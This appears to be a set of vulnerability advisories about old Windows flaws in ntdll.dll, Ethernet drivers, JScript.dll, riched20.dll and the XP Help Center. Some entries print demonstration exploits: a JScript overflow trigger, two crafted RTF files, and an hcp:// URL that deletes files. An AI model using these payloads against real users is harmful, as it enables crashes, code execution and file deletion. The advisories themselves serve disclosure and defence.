Description:
A vulnerability was reported in Microsoft Windows NT.  A remote or local user can create denial of service conditions in some applications running on NT.
@stake reported a vulnerability in a Windows NT 4.0 Server file management function (ntdll.dll) that can be used to cause applications to crash.  According to Microsoft, the affected function does not manage memory operations properly.  An application can make a specially crafted request to the function to cause NT to free some memory that is not owned by the function or the calling application.  As a result, the applicatio that makes the request may fail.

The impact of this flaw depends on the design of the application.

@stake reported finding an attack vector via a Java servlet running on IBM's Java Virtual machine that can allow a remote user to cause the JVM to crash.  However, the flaw is not in the JVM -- the flaw resides in the underlying operating system.

The vendor was reportedly notified on May 14, 2003.

An information disclosure vulnerability was reported in Microsoft Windows Server 2003.  Some Microsoft-certified drivers disclose information from system memory to remote users.
NGSSoftware Insight Security Research warned that several Ethernet drivers that ship with Windows Server 2003 may leak information from memory in the padding of Ethernet frames containing TCP streams.

@stake previously reported that some Ethernet drivers may leak information from any area of physical memory when padding ICMP messages.  According to NGSSoftware, a simliar problem exists in Windows Server 2003 in the Ethernet packets that contain the closing portion of a TCP FIN-ACK exchange.  The report indicates that several drivers that are shipped with Windows Server 2003 and certified by Microsoft are affected, including the VIA Rhine II Compatible network card (integrated into some motherboards) and the AMD PCNet family of network cards.  Several bytes of information, including passwords and other potentially sensitive information, may be included in the data portion of Ethernet frames.

A buffer overflow vulnerability was reported in the Windows Script Engine (JScript.dll).  A remote user could cause arbitrary code to be executed on the target system.
It is reported that there is a buffer overflow in the Windows Script Engine in the processing of JScript code.  A remote user could create malicious HTML content that, when loaded by a target user, could execute arbitrary code on the target user's computer with the privileges of the target user.  An exploit could be delivered via a web page or HTML-based e-mail message.

Microsoft reported that automatic exploitation via an HTML-based email is not possible when using the default configuration of Outlook Express 6.0 and Outlook 2002 or when using Outlook 98 and 2000 in conjunction with the Outlook Email Security Update.

iDEFENSE subsequently issued an advisory providing additional details about this vulnerability.  The iDEFENSE advisory is available at:

http://www.idefense.com/advisory/03.19.03.txt

Some demonstration exploit code was provided:

<script>
    var trigger = [];
    i = 1;
    do {trigger[i] = 1;} while(i++ < 10000);
    trigger[0x3FFFFFFF] = 1;
    trigger.sort(new Function("return 1"));
</script>

iDEFENSE reported that the following JScript.dll versions are vulnerable:  5.1.0.4615, 5.5.0.6330, and 5.6.0.6626.

iDEFENSE also reported that the vulnerability is due an integer overflow in the JsArrayFunctionHeapSort() function.  The function can be made to allocate memory for an array of size 0 and then array indexes can be set to overwrite portions of a different array.

Microsoft was reportedly notified on July 7, 2002.  iDEFENSE credits Roland Postle with discovering this vulnerability.

A buffer overflow vulnerability was reported in the Windows 'riched20.dll'.  A remote user can cause a target user's application to crash.
Security Defence Stdio reported that the overflow can be triggered by specially crafted attributes in an RTF file when the DLL draws figure-strings.  When the figure-string ('\fs') that set a font size exceeds 1024 bytes, the overflow reportedly occurs.  Other attributes can have similar affects.

A demonstration exploit is provided:

{\rtf1\ansi\ansicpg936\deff0\deflang1033\deflangfe2052{\fonttbl{\f0
\fnil\fprq2\fcharset134 \'cb\'ce\'cc\'e5;}}
{\colortbl ;\red255\green0\blue255;}
\viewkind4\uc1\pard\cf1\kerning2\f0
\fs18121111111111111111111111111111111110000 www.yoursft.com\fs20\par
}

Another demonstration exploit is provided:

{\rtf1\ansi\ansicpg936\deff0\deflang1033\deflangfe2052{\fonttbl{\f0
\fnil\fprq2\fcharset134 \'cb\'ce\'cc\'e5;}}
{\colortbl ;\red255\green0\blue255;}
\viewkind4\uc1\pard\cf1\kerning2\f0121111111111111111111111111111111112222
\fs180 www.yoursft.com\fs20\par
}

According to the report, execution of arbitrary code using this flaw is "very difficult."

An input validation vulnerability was reported in Microsoft's Help and Support Center for Windows XP.  A remote user can delete files on a target user's computer.
It is reported that the Help and Support Center application registers the pluggable protocol "hcp://".  This can be used to launch the application from a web site or to navigate within the application.  According to the report, the Help Center will host the page with elevated priviliges, allowing the page to script arbitrary controls with no prompts presented to the user.

The vulnerability is reported to reside in the following file:

%windir%\PCHEALTH\HELPCTR\System\DFS\uplddrvinfo.htm

This file, which is apparently used to upload hardware/driver information collected on the local machine for use in troubleshooting hardware issues, reportedly contains the following scripting code:

var oFSO = new ActiveXObject ( "Scripting.FileSystemObject" );
try
{
oFSO.DeleteFile( sFile );
}

A remote user can create an 'hcp:' URL that specifies a local directory for the 'sFile' parameter that, when loaded by the target user, will delete arbitrary files on  the target user's computer.

A demonstration exploit URL is provided:

hcp://system/DFS/uplddrvinfo.htm?file://c:\windows\*

